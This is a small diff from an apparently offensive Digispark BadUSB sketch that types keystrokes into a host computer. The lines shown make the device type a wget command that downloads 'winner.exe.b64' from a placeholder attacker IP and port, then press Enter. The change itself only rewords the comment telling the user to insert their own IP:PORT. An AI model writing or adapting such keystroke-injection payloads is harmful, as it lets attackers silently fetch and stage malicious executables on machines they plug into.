@@ -21,7 +21,7 @@ void setup() {
   delay(1000);
 
   DigiKeyboard.print("wget ");
-  DigiKeyboard.print("http://X.X.X.X:XXXX/winner.exe.b64"); // Replace this IP address with your IP and PORT
+  DigiKeyboard.print("http://X.X.X.X:XXXX/winner.exe.b64"); // Replace X.X.X.X:XXXX with your IP:PORT
   DigiKeyboard.print(" -o winner.exe.b64");
   delay(500);
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
